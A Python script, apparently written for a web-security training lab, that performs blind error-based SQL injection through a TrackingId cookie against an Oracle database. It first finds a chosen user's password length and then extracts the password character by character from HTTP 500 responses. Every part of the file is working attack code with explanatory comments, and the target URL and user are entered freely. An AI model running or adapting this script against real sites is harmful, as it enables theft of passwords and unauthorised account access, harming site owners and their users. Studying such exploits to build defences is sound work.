import requests #external library -->HTTP request
import string #Standard module Character sets 
from urllib.parse import quote#Standard module -->URL encoding



#User inputs--> target especifics values required to build a sql payloads
url= input("URL TARGET:   ")
tracking_id= input("TrackingId: ") #vulnerable cookie parameter -->Injection point
session= input("Session Cookie: ")#active Session required for authenticated responses
table= input("Users table name:  ")
user= input("Username target:  ")
column_password= input("Name of column password:    ")


#Loop 1: determine password length using conditional response 
#Uses While true because the length is unknown - breaks when status code 500 disappears
length=1
while True:
    payload = f"'||(SELECT CASE WHEN (SELECT LENGTH({column_password}) FROM {table} WHERE username='{user}')>{length} THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    cookies = {"TrackingId": tracking_id + payload, "session": session}
    response = requests.get(url, cookies=cookies)
    print(f'Length: {length} - status: {response.status_code}')
    
    if response.status_code == 500:
        length += 1#password is longer, keep incrementing
    else:
        break#length found , exit loop



characters = string.printable


password=""
# Extract the password character by character 
for position in range(1, length + 1):#iterate through each position in the password
    for char in characters:#try every printiable character at current position
        #build payload for current position and character
        payload_final= f"'||(SELECT CASE WHEN (SELECT SUBSTR({column_password},{position},1) FROM {table} WHERE username='{user}')='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
        cookies= {"TrackingId": tracking_id + quote(payload_final), "session": session}
        response = requests.get(url, cookies=cookies)
        print(f"Testing: {char}  - Status code 500 {response.status_code == 500}")
        ##if Status code 500 appears,  correct character found
        if response.status_code == 500:
            password += char#append found character to password
            break#exit inner loop, move to the next position
        else:
            pass
#output Results
print(f"Password length: {length}")
print(f"Password: {password}")

